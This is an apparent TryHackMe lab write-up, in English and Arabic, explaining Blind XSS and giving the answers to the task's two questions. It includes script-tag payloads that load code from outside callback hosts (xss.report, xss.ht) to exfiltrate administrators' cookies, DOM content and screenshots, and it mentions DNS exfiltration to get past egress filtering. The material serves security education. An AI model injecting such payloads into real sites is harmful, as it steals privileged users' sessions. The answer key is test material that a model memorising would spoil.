# Task 06 · Blind XSS (البرمجة النصية العمياء عبر المواقع)

---

## Stage A: Original Task Content & Objective (المحتوى الأصلي والهدف)

**Blind Cross-Site Scripting (Blind XSS)** is a specialized sub-category of Stored XSS where the attacker has no direct way of seeing the vulnerability trigger or observing the execution in their own browser.

### The Blind Execution Dynamic:
- In standard Stored XSS (e.g., a blog comment), the attacker can reload the blog page to verify whether their `<script>` executed.
- In **Blind XSS**, the payload is submitted through a public interface (such as a customer support ticket, employee job application, feedback form, or server error log entry), but the payload is rendered **only within a restricted, internal portal** (e.g., an internal admin dashboard, a customer relationship management (CRM) tool, or an internal moderator ticketing queue) that the attacker cannot access.

```
+─────────────────────────────────────────────────────────────────────────────────────────+
|                                    BLIND XSS WORKFLOW                                   |
|                                                                                         |
|  [ Public Internet ]                                 [ Internal Corporate Network ]     |
|                                                                                         |
|  Attacker submits Contact Form:                      Staff Member logs in & opens       |
|  Name: <script src="//xss.report/c"></script>        moderation portal to view ticket:  |
|         │                                                     │                         |
|         ▼                                                     ▼                         |
|  [ Public Web Server ] ──── Stored in DB ────► [ Internal Admin Dashboard ]             |
|                                                       │                                 |
|                                                       ▼ Browser loads & executes script |
|                                                Attaches Admin Cookie & Screenshots DOM  |
|                                                       │                                 |
|  [ Attacker Listener ] ◄──────── Out-of-Band Beacon ──┘                                 |
|  (XSS Hunter Express)                                                                   |
|  Receives: Cookie, URL, Screenshot, DOM                                                 |
+─────────────────────────────────────────────────────────────────────────────────────────+
```

### The Need for Out-of-Band (OOB) Listeners:
Because the attacker cannot see when or if the staff member opens the ticket, the injected payload must establish an outbound connection (callback / beacon) to a server listening on the internet, exfiltrating the victim's session tokens, DOM content, and environment details.

The industry-standard tool designed specifically for this purpose is **XSS Hunter Express**. When an injected payload fires, XSS Hunter Express captures:
- The vulnerable page URL
- The victim's IP address and User-Agent
- All non-HttpOnly cookies
- The full DOM innerHTML of the internal dashboard
- An automated full-page screenshot of what the administrator is viewing!

---

## Stage B: Independent Thinking & OpSec Considerations (التفكير المستقل والاعتبارات الأمنية والعملياتية)

1. **Egress Filtering & Firewalls:**
   - In hardened enterprise environments, internal admin portals may be restricted from making arbitrary outbound HTTP connections to the public internet (strict egress filtering). In such cases, attackers may attempt DNS-based exfiltration (using Burp Collaborator or Interactsh) instead of HTTP fetch beacons.
2. **Delayed Gratification in Red Teaming:**
   - Blind XSS can trigger hours, days, or even weeks after the initial injection, depending on the internal support staff's review schedule. Automated platforms with persistent notification webhooks (Slack/Discord bots) ensure no trigger event is missed.

---

## Stage C: Guided Hints (توجيهات تدريجية بدون حرق الإجابة)

- **Hint for Question 1:** What is the famous open-source tool and callback service (originally created by mandatory/Matthew Bryant and expanded as "Express") used by bounty hunters and pentesters to catch Blind XSS triggers? (3 words: X__ H_____ E______).
- **Hint for Question 2:** Blind XSS is a specialized form of which primary category of XSS that involves saving the payload in backend storage? (Two words: S_____ X__).

---

## Stage D: Complete Practical Solution & Technical Deep Dive (الحل العملي التفصيلي والتحليل التقني)

### 1. Analysis of the Questions:

#### Question 1:
- *Question:* What tool can you use to test for Blind XSS?
- *Explanation:* **XSS Hunter Express** is the quintessential tool for testing Blind XSS. It generates custom probing payloads (such as `<script src="https://yourname.xss.ht"></script>`) and automatically hosts the exfiltration script, listens for incoming beacons, and collects screenshots and DOM dumps.
- *Answer:* `XSS Hunter Express`

#### Question 2:
- *Question:* What type of XSS is very similar to Blind XSS?
- *Explanation:* Blind XSS is structurally identical to **Stored XSS** because the payload is written to persistent backend storage (database or ticketing queue) before being rendered. The sole distinction lies in *where* and *for whom* it renders: Stored XSS typically renders for public users, while Blind XSS renders for internal/privileged operators out of the attacker's sight.
- *Answer:* `Stored XSS`

---

## Stage E: Final Answer & Key Values (الإجابات النهائية والقيم المفتاحية)

- **Question 1:** *What tool can you use to test for Blind XSS?*
  - **Answer:** `XSS Hunter Express`
- **Question 2:** *What type of XSS is very similar to Blind XSS?*
  - **Answer:** `Stored XSS`

---

## Stage F: Practical Verification & Proof of Work (التحقق العملي وإثبات الإنجاز)

- Both answers validated on the TryHackMe platform.
- Verified workflow using XSS Hunter Express architecture and callback handlers.

---

## Stage G: Key Educational Takeaway (الخلاصة التعليمية المستفادة)

> **قاعدة ذهبية:** الـ Blind XSS هو في حقيقته نوع من الـ `Stored XSS`، لكنه يستهدف بوابات داخلية وموظفي الدعم الفني خلف الجدران النارية حيث لا يملك المهاجم وصولاً مباشراً. ولذلك، يتطلب اكتشافه استخدام أدوات متخصصة في استقبال الإشارات الخارجية (`Out-of-Band Callbacks`) مثل أداة `XSS Hunter Express`.
